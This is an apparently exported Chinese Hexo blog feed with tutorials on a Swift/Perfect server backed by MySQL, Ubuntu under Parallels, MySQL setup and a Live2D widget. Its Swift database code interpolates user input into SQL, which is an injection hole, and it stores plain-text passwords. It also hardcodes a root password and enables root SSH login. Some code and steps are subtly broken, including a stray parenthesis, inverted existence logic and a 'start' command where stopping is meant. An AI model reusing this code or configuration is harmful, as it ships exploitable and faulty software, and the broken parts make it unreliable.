安装docker大概需要15G左右的磁盘空间，我因为系统盘磁盘空间有限，就没有安装。之前试了下安装大概需要几分钟时间（前提网速够快）。 需要安装的小伙伴，直接点击如图所示的 立即安装docker、等待安装完成即可。 关于想了解更多docker知识的，官网在这里。 使用Perfect Assistant创建项目 安装好Perfect Assistant后，快速创建一个服务端应用，只需要点击创建项目窗口的Perfect模板App： 选择项目需要放置的文件目录及项目名称（我这里还是以最早体验服务端项目的名字命名）。 红框选项可选可不选，勾选后在Xcode编译项目的时候会，会运行及反馈一些linux环境的编译信息，后面需要的时候可以再重新勾选，现在的电脑配置其实勾选了也并不会增加太长的编译时间。 配置处理项目依赖 项目依赖都是通过Swift的包管理器处理的，Swift包依赖管理请参考官方文档. 创建项目完成会默认先拉取模板应用的相关依赖，在默认应用中默认已经配置过HTTPServer依赖了，处理窗口如下： 后期需要添加自己的依赖库时候，如数据库、打印等等，只需要在下面的可用依赖窗口中选择需要依赖直接拖拽到上面项目依赖窗口即可。 如果在可用依赖窗口没有找到我们需要的，也可以点项目依赖窗口右边的+号按钮，添加自定义的项目依赖：其实就是添加依赖的Package Manager地址及功能类别。 更多Perfect Assistant工具使用及功能介绍，请参考官方文档。 编译运行项目 项目依赖处理完成，就可以找到我们创建的项目目录下的iNoteServer.xcodeproj文件，具体名称请参考你创建项目的名称，通过Xcode打开。 注意，在项目Scheme中选择可执行文件，默认选中的的是项目名称-Package。 然后直接编译运行，就可以看到控制台输出： 1[INFO] Starting HTTP server localhost on 0.0.0.0:8181 此时就已经开了一个本地端口8181的服务，直接在浏览器输入上述地址及端口，就可以看到令人兴奋的Hello, world!了。 使用终端新建Perfect项目 使用终端命令创建项目也不是很复杂，重要的是可以自己把控项目创建的细节，创建出来的项目更加的干净，我比较喜欢使用终端创建项目。 使用终端新建项目 创建一个存放项目的文件夹iNote，后续服务端对应的客户端项目iNoteClient也可以放在这个文件夹内。 在iNote文件夹下创建一个存放服务端项目的文件夹iNoteServer。 将iNoteServer目录初始化为一个Git仓库。 创建Package.swift文件，该文件是用Swift包管理器（SPM）管理依赖需要的，用来管理整个项目的依赖。我们可以使用Xcode打开该文件，编辑添加需要的项目依赖。如： 123456789101112131415import PackageDescriptionlet versions = Version(0,0,0)..&lt;Version(10,0,0)let urls = [ "https://github.com/PerfectlySoft/Perfect-HTTPServer.git", // 最基本的服务器核心依赖 "https://github.com/PerfectlySoft/Perfect-MySQL.git", // MySQL服务器 "https://github.com/PerfectlySoft/Perfect-Logger.git", // 日志处理库 "https://github.com/PerfectlySoft/Perfect-RequestLogger.git" // 请求日志处理库]let package = Package( name: "iNoteServer", targets: [], dependencies: urls.map &#123; .Package(url: $0, versions: versions) &#125;) 回到终端，创建Sources目录，该目录用于存放我们自己写的项目源代码。 创建一个程序入口文件，并在空文件中插入一个打印函数： 1echo 'print("hello world!")' &gt;&gt; Sources/main.swift 配置处理项目依赖 项目依赖已经配置完成，此时需要处理项目依赖并生成可执行文件： 处理过程会在终端输出对应的信息，时间长短取决于在Package.swift文件中配置的依赖库多少及每个库大小。 生成的可执行文件在项目的根目录的debug目录下。 1swift build 默认是生成的Debug版本的可执行文件，如果是正式部署服务器的可执行文件，可使用如下指令生成发布版本可执行文件： 生成的可执行文件在项目的根目录的release目录下。 1swift build -c release 一般很快就可以处理完成，处理完成就会在终端输出信息可以看到生成了一个由项目名称命名的可执行文件，根据提示信息执行对应的可执行文件，就可以输出我们的打印信息了： 12./build/debug/iNoteServer // debug模式./build/release/iNoteServer // release模式 可以使用Swift包管理器创建一个xxx.xcodeproj文件用于使用Xcode来管理和编辑调试项目，执行下面的指令，生成Xcode项目管理文件： 1swift package generate-xcodeproj 配置项目文件的搜索目录为整个项目目录： $(SRCROOT)代表的时项目根目录下 $(PROJECT_DIR)代表的是整个项目 1$(PROJECT_DIR) 如果添加新的项目依赖库后只需要重新swift build 或者 swift build -c release等待完成即可。 如果添加新的依赖后出现未知错误，可尝试删除项目根目录下的xxx.xcodeproj文件，然后使用swift package generate-xcodeproj重新生成项目文件即可。 搭建HTTP服务器 创建iNoteAIP文件，用于管理所有的路由。大概分为用户及笔记两类。 12345678910111213141516171819202122enum iNoteAIP: String &#123; case base = "/iNote" /// 注册页面 case register = "/register" /// 登录页面 case login = "/login" /// 获取笔记列表 case notes = "/notes" /// 添加笔记 case creatNote = "/creatNote" /// 删除笔记 case removeNote = "/removeNote" /// 修改笔记 case editNote = "/editNote"&#125; 创建一个NetworkServerManager文件用于服务器的相关操作，如服务器开启及停止，端口监控、路由监控及处理等等。 关于服务器API设计及命名，请参考服务端指南 | 良好的 API 设计指南这一篇文章，写的很不错。 首先实例化一个HTTPServer对象，绑定指定的端口，并添加项目需要用到的路由。 1234567891011121314151617181920212223242526272829303132// 导入需要的头文件import PerfectHTTPimport PerfectHTTPServerimport PerfectRequestLoggerimport PerfectLoggerclass NetworkServerManager &#123; let server = HTTPServer() var routes = Routes(baseUri: iNoteAIP.base.rawValue) var api1Routes = Routes(baseUri: "/v1") // 将所有的路由根据版本号进行区分管理，方便后期接口逻辑调整，新版本不会影响到旧版本 static let shared = NetworkServerManager() private init() &#123; routesConfigure() // 配置路由 loggerConfigure() // 配置日志工具 &#125; func serverStart(_ port: UInt16 = 8181) &#123; // 监听端口 绑定路由 server.serverPort = port server.addRoutes(routes) do &#123; try server.start() &#125; catch PerfectError.networkError(let code, let message) &#123; print("network error:\(code) \(message)") &#125; catch &#123; print("unknow network error: \(error)") &#125; &#125;&#125; 具体的项目添加的路由（以注册为例子）以及配置系统的日志工具（日志信息记录到本地文件）。 12345678910111213141516171819202122232425262728293031323334353637383940414243extension NetworkServerManager &#123; private func addRoute(with method: HTTPMethod, uri: iNoteAIP, handler: @escaping RequestHandler) &#123; api1Routes.add(method: method, uri: uri.rawValue, handler: handler) &#125; /// 配置各个模块的路由 private func routesConfigure() &#123; addRoute(with: .post, uri: .register, handler: registerHanlder())// addRoute(with: .post, uri: .login, handler: loginHanlder())//// addRoute(with: .post, uri: .creatNote, handler: creatNoteHanlder())// addRoute(with: .post, uri: .editNote, handler: editNoteHanlder())// addRoute(with: .delete, uri: .removeNote, handler: removeNoteHanlder())// addRoute(with: .get, uri: .notes, handler: notesHanlder()) // 所有路由 routes.add(api1Routes) &#125; /// 添加日志文件记录 private func loggerConfigure() &#123; // 日志路径 let logPath = "./files/logs" if !Dir(logPath).exists &#123; try? Dir(logPath).create() &#125; LogFile.location = "\(logPath)/iNoteServer.log" // 设置日志文件路径 // 增加日志过滤器，将日志写入相应的文件 server.setRequestFilters([(RequestLogger(), .high)]) // 首先增加高优先级的过滤器 server.setResponseFilters([(RequestLogger(), .low)]) // 最后增加低优先级的过滤器 // 项目中根据打印级别打印信息 //LogFile.debug("调试") //LogFile.info("消息") //LogFile.warning("警告") //LogFile.error("出错") //LogFile.critical("严重错误") //LogFile.terminal("服务器终止") &#125;&#125; 处理路由绑定的回调，即当用户触发的对应接口会在这个地方处理，以注册路由绑定的回调为例子： 123456789101112131415//MARK: 处理路由回调extension NetworkServerManager &#123; func registerHanlder() -&gt; RequestHandler &#123; return &#123; request, response in let user = User() user.userName = request.param(name: "userName") user.password = request.param(name: "password") let resultString = UserMediator.creat(a: user) response.setBody(string: resultString) response.completed() &#125; &#125;&#125; 创建一个UserMediator文件作为用户逻辑的中间层，用于管理用户的相关的逻辑，如用户是否重名、参数是否合法，响应数据格式处理等等： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970enum ResponseStatus: String &#123; case success = "Success" case failure = "Failure"&#125;enum ResponseErrorMessage: String &#123; case parameterIncompleteness = "参数不完整" case userExist = "用户已经注册" case userCreationFailed = "用户注册失败" case wrongUsernameOrPassword = "用户名密码错误"&#125;let TableName = "T_User" // 数据库中的用户表class UserMediator &#123; /// 创建成功返回对应的用户信息，不成功返回失败原因 static func creat(a user: User) -&gt; String &#123; guard let userName = user.userName, let password = user.password, userName.count &gt; 0, password.count &gt; 0 else &#123; return self.handle(with: .failure, isSuccess: false, message: ResponseErrorMessage.parameterIncompleteness.rawValue, value: []) &#125; // 用户是否存在 let isExist = DataBaseManager.shared.isExist(of: userName, in: TableName) if isExist &#123; return self.handle(with: .failure, isSuccess: false, message: ResponseErrorMessage.userExist.rawValue, value: []) &#125; // 创建用户 let isSuccess = DataBaseManager.shared.store(user: user, to: TableName) if !isSuccess &#123; return self.handle(with: .failure, isSuccess: false, message: ResponseErrorMessage.userCreationFailed.rawValue, value: []) &#125; // 是否创建用户成功 let users = DataBaseManager.shared.users(of: userName, in: TableName) return self.handle(with: .success, isSuccess: true, message: nil, value: users) &#125;&#125;extension UserMediator &#123; /// 服务器响应数据处理 /// /// - Parameters: /// - state: 服务器响应结果（实际处理应该为响应结果状态枚举，本处简单的处理为成功/失败） /// - isSuccess: 是否成功的标记 /// - message: 描述信息 /// - value: 响应数据 /// - Returns: 响应数据序列化为json字符串 static func handle(with state: ResponseStatus, isSuccess: Bool, message: String?, value: [[String: Any]]?) -&gt; String &#123; let resultDict: [String : Any] = [ "status" : state.rawValue, "flag" : isSuccess, "message" : message ?? "", "value" : value ?? [] ] do &#123; return try resultDict.jsonEncodedString() &#125; catch &#123; print(error) return "" &#125; &#125;&#125; MySQL数据库 MySQL数据库的安装，请参考之前的文章，本文开头有跳转连接。 创建数据库和表 创建并配置MySQL数据库，本文以Navicat Premium为例子。 打开Navicat Premium软件，点击左上角的连接，选择MySQL，在弹出的窗口中输入对应的信息：如我的连接名称为iNote，其他选项如Host、Port、User Name保持默认，密码即为你的安装的MySQL密码。 配置完服务器信息，就可以创建一个数据库，例如我创建一个名字为iNoteDB的数据库。 在iNoteDB数据库中简单的新建了两张表，一张是用户表T_Users， 一张是笔记表T_Note。表结构如下： 我的字符集选utf-8，排序规则utf8_general_ci。 我们也可以手动在表中插入数据，如我们在用户表中插入一条数据，用户名西门抽血，密码1234567。 数据库管理工具 创建DataBaseManager文件，用户管理数据库的连接、关闭及数据CRUD操作。 数据库的连接配置文件如下： 1234567//MARK: 数据库信息struct MySQLConnector &#123; static let host = "127.0.0.1" static let account = "root" static let password = "1234567" // 之前安装的MySQL服务器的密码 static let database = "iNoteDB" // 刚刚创建的数据库名称&#125; 创建数据库管理者 123456789101112131415class DataBaseManager &#123; /// 单例 全局数据库工具访问点 static let shared = DataBaseManager() private var mysql: MySQL private init() &#123; mysql = MySQL.init() // 创建MySQL对象 let connected = mysql.connect(host: MySQLConnector.host, user: MySQLConnector.account, password: MySQLConnector.password, db: MySQLConnector.database) guard connected else &#123; print("MySQL连接失败" + mysql.errorMessage()) return &#125; &#125;&#125; 操作数据库进行常规的CURD isExist方法 用于查询特定的用户是否存在 store方法 用于缓存一条用户记录到本地 users方法 用于查询特定的一条用户数据记录 Perfect对MySQL的支持还不是很完善，写出来的代码比较丑陋，可以尝试下使用其他的数据或者配套的对象管理函数库（ORM），总的来说支持的服务器种类还是比较完善的，总能找到你中意的一款。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576//MARK: Userextension DataBaseManager &#123; func isExist(of userName: String, in tableName: String) -&gt; Bool &#123; let sql = "SELECT * FROM \(tableName) WHERE userName = '\(userName)'" if !mysql.query(statement: sql) &#123; LogFile.error("Error query : \(sql)") return false &#125; // 在当前会话过程中保存查询结果 let resultSets = mysql.storeResults() var resultArray = [[String: String]]() resultSets?.forEachRow(callback: &#123; (row) in let userID = row[0] let userName = row[1] let password = row[2] let created = row[3] let updated = row[4] var dict = [String: String]() dict["userID"] = userID dict["userName"] = userName dict["password"] = password dict["created"] = created dict["updated"] = updated resultArray.append(dict) &#125;) guard let numRows = mysql.storeResults()?.numRows(), numRows &lt;= 0 else &#123; return false &#125; return true &#125; func store(user: User, to tableName: String) -&gt; Bool &#123; guard let userName = user.userName, let pwd = user.password else &#123; return false &#125; let values = "('\(userName)', '\(pwd)')" let sql = "INSERT INTO \(tableName) (userName, password) VALUES \(values))" if !mysql.query(statement: sql) &#123; LogFile.error("Error query : \(sql)") return false &#125; return true &#125; func users(of userName: String, in tableName: String) -&gt; [[String: Any]]? &#123; let sql = "SELECT * FROM \(tableName) WHERE userName = '\(userName)'" if !mysql.query(statement: sql) &#123; LogFile.error("Error query : \(sql)") return nil &#125; // 在当前会话过程中保存查询结果 let resultSets = mysql.storeResults() var resultArray = [[String: String]]() resultSets?.forEachRow(callback: &#123; (row) in let userID = row[0] let userName = row[1] let password = row[2] let created = row[3] let updated = row[4] var dict = [String: String]() dict["userID"] = userID dict["userName"] = userName dict["password"] = password dict["created"] = created dict["updated"] = updated resultArray.append(dict) &#125;) return resultArray &#125;&#125; 启动及测试服务器 在程序入口Main.swift文件配置启动服务器，因为上面我们已经在服务器管理者这个文件中封装好了启动方法，此时就可以一行搞定： 12// 启动服务器NetworkServerManager.shared.serverStart() 运行项目，等待控制台输出如下信息代表启动服务器成功，然后测试注册服务器接口了，以post请求的注册接口为例子： 我们这里使用Paw工具测试网络接口，当然你们也可以使用Post Man测试，甚至你想的话可以自己写网络接口调用测试。 如果是get请求，你可以直接在浏览器就可以测试，如果你想改下本例子的请求方式，只需要在路由配置方法中把.get改为.post即可。 1[INFO] Starting HTTP server on 0.0.0.0:8181 例如我们测试，用户名西门抽血，密码1234567进行注册，因为之前我们在数据库中手动添加了一条相同记录，所以注册结果如下图：接口调用成功，服务器返回注册失败信息。 结尾 本文只是对使用Perfect搭建服务器的一个概要性总结，希望大家通过本文可以对Swift开发服务器整个流程有一个认识，具体的细节和注意点都待完善。 至于项目Demo，肯定是有的，但是目前是不可能给到大家了，因为我还没有写完啊，目前只是写了一个粗略的注册接口，并且逻辑还没写完😂。 其实项目的完善部分就集中在接口响应处理的对服务器CRUD部分了，因为使用Mysql服务器用的很不顺手，可能会换用其他比较完善的数据库再完善这一部分。 等服务端写完，在开坑对应的客户端，客户端就不用说了，大家估计都快写吐了😂。至于什么时候能写完，我自己都不知道，毕竟我这么懒🌚🌝！ 参考官方文档Perfect官方文档在这里Swift官方文档Swift包管理器.服务端指南 | 良好的 API 设计指南服务端写Swift体验 (Perfect框架)Swift3.0服务端开发(一) 完整示例概述及Perfect环境搭建与配置（服务端+iOS端）]]></content>
      <categories>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>服务器</tag>
        <tag>Swift</tag>
        <tag>Perfect</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Swift开发服务端（二）：使用Parallels Desktop虚拟机安装Ubuntu系统及相关配置]]></title>
    <url>%2Farchives%2F64bb63f1.html</url>
    <content type="text"><![CDATA[故乡是一个人的羞涩处，也是一个人最大的隐秘。我把故乡隐藏在身后，单枪匹马去闯荡生活。我在世界的任何一个地方走动，居住和生活，那不是我的，我不会留下脚印。 ——刘亮程《一个人的村庄》 简介 Swift对Mac的原生支持就不用多说了，虽然是开源编程语言，但是有她亲爹苹果在后面支持，能不原生支持苹果系统🌝？ 好消息是Swift开源后支持Linux，我们可以在Linux上面使用Swift配置环境，编写、编译、部署服务器了。 本文将介绍如何通过使用Parallels Desktop虚拟机（以下简称PD），在Mac系统下安装Ubuntu系统级注意点。 当然、你也可以直接安装一个Linux系统，或者在其他电脑安装Linux系统，全凭个人爱好。 Swift开发服务端（一）：MySQL安装及配置 正文 PD是一款相当强大且好用的虚拟机，可以安装Android、Mac、windows、以及比较常用的Linux系统（至于如何获取该软件，自己看着办😂）。 PD已经集成了上面系统的下载安装功能。如果你的网速比较快、而且磁盘空间也比较充裕的情况下，强烈推荐使用这种方式安装，完全适合像我这种比较懒的人。 当然了，我是通过单独下载安装包的方式安装的，你问我为什么？当然是因为这样显得逼格比较高啊🌚。 好吧，肯定很多小伙伴不相信，其实我自己都不相信emmm，主要是因为我使用公司的iMac、系统盘是后来加的SSD，容量没有多少了，所以只能手动安装到原来的1T机械硬盘里面了。 安装自动下载安装 打开PD,选择需要安装的Linux，点击下一步： 点击下载按钮开始下载安装，没什么需要说的： 手动安装下载Ubuntu安装包 在Ubuntu downloads下载安装包。 有桌面版和服务器版本，桌面版会比服务器版安装包大一些，多了一些界面元素。服务器版偏向于命令行操作，如何选择看个人爱好。 我是想顺便体验下Ubuntu系统，所以安装的是16.04的桌面版。 安装 打开PD,选择通过镜像文件安装，点击下一步： 可以手动选择文件路径，也可以将下载的安装包拖拽到当前的PD窗口放手就可以： 完成后选择需要安装的镜像文件，继续下一步，输入账号密码： 选择安装名称以及安装目录： 之后跟着提示一路确定就可以安装成功，进入登录界面，输入密码进入系统（我这里显示效果已经优化过，你安装完可能和我的有一些细微的差别，具体设置在下面）： 虚拟机设置 如果有需要对虚拟机重新配置一些参数、如磁盘大小、内存大小、键盘、网络等等、都可以通过虚拟机窗口右上角的设置选项重新配置。 也可以在虚拟机菜单里面找到该设置选项。 所有修改都需要重新启动虚拟机才可以生效。 优化配置Ubuntu全屏设置 默认安装完成后，Ubuntu窗口是无法适配全屏的，看着很难受。需要手动安装Parallels Tools。 点击PD虚拟机的窗口右上角的黄色感叹号（第一次安装会有），或者从菜单选择Install Parallels Tools，然后根据提示一步步操作即可。 如果安装不成功，可以手动安装 打开Ubuntu的 Terminal （快捷键：Ctrl + Option + T）. 切换到系统管理员权限: 1sudo su // or su 确保虚拟机的DVD驱动已经退出 1eject /dev/cdrom 选择PD菜单 &gt; Devices &gt; CD/DVD &gt; Connect image，选择 /Applications/Parallels Desktop/Contents/Resources/Tools目录下的prl-tools-lin.iso文件. 挂载Parallels Tools镜像到Linux虚拟机: 12mkdir /media/cdrommount /dev/cdrom /media/cdrom 检查镜像是否被成功挂载 1234ls /media/cdrom// 输出信息install* installer/ install-gui* kmods/ tools/ version 进入到镜像文件目录下，执行安装包： 12cd /media/cdrom./install Ubuntu分辨率 安装完成Parallels Tools后，系统的分辨率默认是Mac系统的最高分辨率，我的iMac分辨率是4K，导致显示内容被缩放的特别小，非常难受。 更难受的是默认无法更改分辨率，本着有条件要上，没条件创造条件也要上的原则，找到了修改分辨率的方法： 打开终端输入xrandr查看系统支持的分辨率，*标识正在使用的分辨率： 打开系统诊断框，将可以选择勾选一些调试选项，也可以什么也不做，命令如下： 1sudo xdiagnose 点击应用，关闭诊断窗口 修改完成后需要重新启动虚拟机，可以在虚拟机菜单栏点击重启选项，也可以使用如下命令： 1sudo reboot 打开Ubuntu系统的设置菜单，进入显示设置，此时里面已经可以设置不同的分辨率了。但是我发现可以直接使用最高的分辨率，只需要修改菜单和标题缩放比例就可以使整个界面很干净通透的显示效果了。 系统文件修复 由于Mac系统（突然断电或死机或未正常关闭）关闭或者虚拟机非正常关闭都可能会导致磁盘检测不能通过，无法正常进入Ubuntu系统： 123456789101112dev/sda1: Inodes that were part of a corrupted orphan linked list found./dev/sda1: UNEXPECTED INCONSISTENCY:; RUN fsck MANUALLY (i.e., without -a or -p options)fsck exited with status code 4The root filesystem on /dev/sda1 requires a manual fsckmodprobe: module ehci-orion not found in modules.depBusyBox v1.22.1 (Debian 1:1.22.0-9+deb8u1) built-in shell (ash)Enter 'help' for a list of built-in commands./bin/sh: can't access tty; job control turned off(initramfs) _ 解决方法：输入下面指令后，按照提示一路回车（yes）操作后，会自动重启即可解决 1(initramfs) fsck -c /dev/sda1 // 修复对象取决于出错的对象，可以是一块磁盘或者一个VG root权限 sudo + 命令，输入当前用户密码后以root权限执行命令，有时间限制且仅限当前命令。 sudo -i，输入当前用户密码后以root权限登录shell，无时间限制。使用exit或logout退出。 su，输入root账户的密码后切换到root身份，无时间限制。su用户名切换回其它用户。 sudo su，效果同su，只是不需要root的密码，而需要当前用户的密码。 设置root密码 Ubuntu的默认root密码是随机的，即每次开机都有一个新的root密码。 如果需要设置root用户密码，命令如下： 会需要输入默认用户密码 设置root用户密码 确认root用户密码 1sudo passwd root 修改成功后，需要root权限，执行su root命令，输入root密码就可以了。 其他问题VIM方向键及删除键 系统默认自带的vim方向键不能和Mac下一样自如的切换光标位置，会变成ABCD，而且删除键也失效。 解决方法： 更新系统的包管理工具，apt-get是Linux自带的包管理工具，类似于Mac系统的homebrew. 1sudo apt-get update 移除系统自带的vim 1sudo apt-get remove vim-common 下载安装新的vim 1sudo apt-get install vim 更多vim相关的知识传送门 ssh远程连接 因为我们需要直接在本地电脑远程访问服务器如我们的虚拟机Ubuntu系统、传输文件等，此时就需要开启ssh服务，linux不同于Mac系统，默认是没有安装ssh服务的，需要我们自行下载安装。 安装ssh服务，命令如下： 1sudo apt-get install openssh-server 确认ssh-server是否启动 如果存在ssh-agent和sshd说明已经开启成功 1ps -e | grep ssh 如果没有sshd，需要手动启动 1sudo /etc/init.d/ssh start ssh-server默认端口是22，可以通过SSH配置文件更改包括端口、是否允许root登录等设置, 配置文件目录如下，修改完成重启ssh-server即可。 12345678// 配置文件目录/etc/ssh/sshd_config// 可通过vim修改sudo vi /etc/ssh/sshd_config// 重启sudo /etc/init.d/ssh restart 关于更多ssh远程连接以及远程scp文件传输，可以参考之前写的这篇文章的SSH部分 远程登录报错 在本地远程登录linux 服务器系统时，提示Permission denied, please try again. 。 原因：ssh服务默认没有开root用户的ssh权限。所以远程登录时默认下root用户是没有权限的。 解决方法：要修改root的ssh权限 将/etc/ssh/sshd_config文件中PermitRootLogin prohibit-password注释掉（前面加#号）。 添加 PermitRootLogin Yes 1sudo vi /etc/ssh/sshd_config 显示隐藏文件 若使用桌面可视化窗口，进入该待显示的文件目录，快捷键ctrl + h则显示隐藏文件。 若使用命令行，则使用命令：ls -a显示所有文件，也包括隐藏文件。 参考 Parallels Tools manual installation in Linux virtual machine Mac使用parallels desktop安装 ubuntu 分辨率问题]]></content>
      <categories>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>服务器</tag>
        <tag>Swift</tag>
        <tag>Linux</tag>
        <tag>Parallels Desktop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Swift开发服务端（一）：MySQL安装及配置]]></title>
    <url>%2Farchives%2F6efe8aae.html</url>
    <content type="text"><![CDATA[经过许多个冬天之后，我才渐渐明白自己再躲不过雪，无论我蜷缩在屋子里，还是远在冬天的另一个地方，纷纷扬扬的雪，都会落在我正经历的一段岁月里。当一个人的岁月像荒野一样敞开时，他便无法照管好自己，落在一个人一生中的雪，我们不能全部看见，每个人都在自己的生命中，孤独地过冬。 ——刘亮程《寒风吹彻》 简介 最近想重新折腾一下Swift的服务端开发，为什么说是重新折腾呢？因为我在年初（大概是1月份）的时候就已经折腾过了，照着别人的教程体验了一下Swift开发服务端，使用的是加拿大的一个开发小组孵化的开源服务端框架Perfect。 但是，体验完就尘封了，一如之前的Swift学习，间歇性的😂。而且那时候还没真正用Swift开发过项目，所以对一些Swift的高级语法和特性还不是很熟悉，所以，这个锅是Swift的，我不背🌚🌚。 最近突然想换体验一下其他端的开发思路，嗯、是的，很突然🌝。所以就想把一些学习记录和踩坑过程记录下来。 因为我之前已经安装过Mac端的MySQL，但是还是想在这里总结记录一下。 正文 MySQL安装可以直接去官网下载安装包下载，也可以使用homebrew安装，但是我实在是记不起我之前是用哪一种方式安装的了。不过，鉴于我这么懒，应该是使用的homebrew🤣🤪。 但是这里、两种安装方式我都会介绍。 手动安装下载安装MySQL 首先去MySQL官网下载安装包。 截止目前最新版本是MySQL Community Server 8.0.12，但是后面使用Perfect开发的时候，8.0.12会出现问题，所以推荐使用5.7.23 下载5.7.23版本步骤如下： 下载完成后，双击打开进行安装，按步骤一步一步的安装即可。 注意最后一步，会有一个弹框，里面有默认生成的随机密码，记得保存，后面会用到。 密码在：root@localhost:xxxxxxxx 查看是否安装成功 打开系统偏好设置，最下面会出现MySQL图标 开启MySQL服务 在终端查看MySQL版本 12345// cmdmysql --version// messagemysql Ver 14.14 Distrib 5.7.21, for osx10.12 (x86_64) using EditLine wrapper MySQL配置 &amp; 登录系统环境变量配置 进入cd /usr/local/mysql/bin目录 执行 ls -l，查看是否存在mysql文件。 使用vim编辑bash_profile文件，命令：vim ~/.bash_profile。 在该文件中添加mysql/bin的目录，按i进入编辑模式，加入如下内容： 1export PATH=$&#123;PATH&#125;:/usr/local/mysql/bin 添加完成后，按esc退出编辑模式，然后输入 :wq保存并退出vim 执行这个文件，使新添加的环境变量有效，命令如下： 1source ~/.bash_profile 登录MySQL 参考上面步骤，进入系统偏好设置，开启MySQL服务 终端执行mysql -uroot -p指令，会提示输入密码，密码就是安装是保存的密码，输入即可。 一切顺利就可以登录成功了。 通过Homebrew安装 使用homebrew安装就更简单了，懒人必备，安装homebrew参考这里。 安装mysql 1brew install mysql 安装完成查看版本 12345// cmdmysql --version// messagemysql Ver 14.14 Distrib 5.7.21, for osx10.12 (x86_64) using EditLine wrapper 开启mysql服务 1mysql.server start 安装完root用户默认没有密码，需要配置root用户密码提高安全性。 设置root用户密码 删除匿名账号 取消root用户远程登录 删除test库和对test库的访问权限 刷新授权表使修改生效 12// 安装安全配置向导mysql_secure_installation 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364Securing the MySQL server deployment.Connecting to MySQL using a blank password.VALIDATE PASSWORD PLUGIN can be used to test passwordsand improve security. It checks the strength of passwordand allows the users to set only those passwords which aresecure enough. Would you like to setup VALIDATE PASSWORD plugin?Press y|Y for Yes, any other key for No: yThere are three levels of password validation policy: // 密码安全策略LOW Length &gt;= 8MEDIUM Length &gt;= 8, numeric, mixed case, and special charactersSTRONG Length &gt;= 8, numeric, mixed case, special characters and dictionary filePlease enter 0 = LOW, 1 = MEDIUM and 2 = STRONG: 0Please set the password for root here.New password: // Root用户密码Re-enter new password: // 确认Root用户密码Estimated strength of the password: 50 Do you wish to continue with the password provided?(Press y|Y for Yes, any other key for No) : yBy default, a MySQL installation has an anonymous user,allowing anyone to log into MySQL without having to havea user account created for them. This is intended only fortesting, and to make the installation go a bit smoother.You should remove them before moving into a productionenvironment.Remove anonymous users? (Press y|Y for Yes, any other key for No) : ySuccess.Normally, root should only be allowed to connect from'localhost'. This ensures that someone cannot guess atthe root password from the network.Disallow root login remotely? (Press y|Y for Yes, any other key for No) : ySuccess.By default, MySQL comes with a database named 'test' thatanyone can access. This is also intended only for testing,and should be removed before moving into a productionenvironment.Remove test database and access to it? (Press y|Y for Yes, any other key for No) : y - Dropping test database...Success. - Removing privileges on test database...Success.Reloading the privilege tables will ensure that all changesmade so far will take effect immediately.Reload privilege tables now? (Press y|Y for Yes, any other key for No) : ySuccess.All done! 登录mysql 1mysql -uroot 修改MySQL密码 安装生成的密码是随机生成的字符串，我连自己设置的密码都记不住了，还TM记这个密码🌚。 如果记得初始密码 如果还没有忘记初始密码，那么恭喜你，修改很简单。 执行mysql -uroot -p指令，输入默认密码登录MySQL。 newPassword为新密码，直接修改即可。 1SET PASSWORD FOR 'root'@'localhost' = PASSWORD('newPassword'); 如果忘记初始密码 修改密码步骤如下： 关闭mysql服务，可以在系统偏好设置关闭，也可以在终端执行如下命令： 1sudo /usr/local/mysql/support-files/mysql.server start 进入mysql目录 1cd /usr/local/mysql/bin/ 获取管理员权限 1sudo su 禁止mysql验证功能，mysql会自动重启，偏好设置中的mysql状态会变成running 1./mysqld_safe --skip-grant-tables &amp; 新开一个终端窗口，进入mysql目录 1cd /usr/local/mysql/bin/ 输入如下两个指令执行并刷新 12./mysqlflush privileges; // 分号不要忘了 修改新密码 1set password for 'root'@'localhost' = password('newPassword'); 参考 Assigning Account Passwords]]></content>
      <categories>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>服务器</tag>
        <tag>Swift</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于Hexo博客加载Live2D动画模型挂件]]></title>
    <url>%2Farchives%2Fcb206c67.html</url>
    <content type="text"><![CDATA[许多年之后你再看，骑快马飞奔的人和坐在牛背上慢悠悠赶路的人，一样老态龙钟回到村庄里，他们衰老的速度是一样的。时间才不管谁跑得多快多慢呢。 ——刘亮程《一个人的村庄》 简介 最近有几位博友问我关于Hexo博客加载动画挂件的问题，他（她）们可能是由于不知道这个功能是用Live2D实现的，要不然随便网上一搜、教程可能一大把。 既然有这么小伙伴问，那么存在就是合理的、所以就单独写一篇文章简单介绍一下怎么实现这个功能。 本文基于Hexo博客的Next主题（其他主题也都大同小异，可以参考）。 Live2D的工作原理是通过将一系列的2D图像进行平移、旋转和变形等操作，生成一个具有自然动画效果的可动人物模型。由于Live2D只需一系列2D原图即可生成具有类似于3D动画效果的模型，比3D建模耗费的时间和成本更少，因此受到很多游戏制作者，特别是小成本AVG和手游作者的喜爱。另外，Live2D生成的模型相对于真正的3D模型，可以更好地还原手绘风格。Live2D生成的模型并不是真正的3D模型，因此具有一些局限性，比如无法进行大幅度的转身动作。但是貌似Live2D Euclid可以达到这一效果。 安装 &amp; 部署安装Live2D模块 使用如下指令安装Live2D模块、注意需要在博客的根目录通过终端执行 1npm install --save hexo-helper-live2d 如果不想使用、想彻底卸载，命令如下： 1npm uninstall hexo-helper-live2d 安装完成之后，就会在博客的根目录package.json文件中存在依赖 在博客根目录的node_moduels文件夹下可以看到安装的Live2D模块 了解更多可参考github 和 官网 配置喜欢的动画模型 有非常多的Live2D动画模型供我们选择： 动画模型效果可以参考这里 对应的模块下载在这里 如我使用的是tororo，可以直接在上面的下载界面: 手动下载完成之后将packages里面的所有文件拷贝到博客根目录的node_moduels文件夹下。 也可以使用包管理器安装，命令格式：npm install 模型的包名，也会安装在node_moduels目录下。 配置博客的站点文件 打开博客根目录的配置文件_config.yml，添加如下内容： 12345678910111213141516171819202122# Live2D## https://github.com/xiazeyu/live2d-widget.js## https://l2dwidget.js.org/docs/class/src/index.js~L2Dwidget.html#instance-method-initlive2d: model: scale: 1 hHeadPos: 0.5 vHeadPos: 0.618 use: live2d-widget-model-tororo // 下载的动画模型名称 display: superSample: 2 width: 120 height: 